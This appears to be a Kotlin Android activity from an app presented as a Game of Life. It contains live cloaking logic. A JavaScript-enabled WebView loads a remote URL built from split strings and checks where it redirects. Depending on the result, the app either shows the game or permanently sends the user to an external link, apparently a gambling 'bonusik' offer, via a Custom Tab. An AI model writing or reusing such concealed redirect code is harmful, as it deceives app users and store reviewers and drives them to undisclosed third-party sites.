package com.adt.game_of_life.view.activity

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.support.customtabs.CustomTabsIntent
import android.support.v4.content.ContextCompat
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import com.adt.game_of_life.R
import com.adt.game_of_life.util.VrivSharedPreferences
import kotlinx.android.synthetic.main.activity_loading.*


class LoadingActivity : AppCompatActivity() {

    private var preferences : VrivSharedPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)
        window.statusBarColor = Color.BLACK
        actionBar?.hide()
        supportActionBar?.hide()
        preferences = VrivSharedPreferences(this).apply { getSharedPreference("vrivaisa") }
        val apiLink = preferences!!.getString("vrivaisa")
        if(apiLink != null && apiLink != "") executeWikiResponse(apiLink)
        else checkInternet()
    }

    private fun executeWikiResponse(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        //job.cancel()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }

    private fun checkInternet(){
        vriv_response.settings.javaScriptEnabled = true
        vriv_response.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,

                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(req.contains("p.php")){
                    Log.e("Bot", "p")
                    openMain()
                }
                else{
                    if(!req.contains("bonusik")){
                        //NotificationMessage().scheduleNotification(this@LoadingActivity)
                        Log.e("Kek", "add")
                        preferences?.putString("vrivaisa", "http://trrfcbt.com/JZnrgm")
                        executeWikiResponse("http://trrfcbt.com/JZnrgm")
                    }
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)
        val protocol = "http://"
        val site = "trrfcbt.com/"
        val php = "9kGqZH"
        vriv_response.loadUrl("$protocol$site$php")
    }

    private fun openMain(){
        progress_bar.visibility = View.GONE
        startActivity(Intent(this, SplashActivity::class.java))
        vriv_response.destroy()
    }
}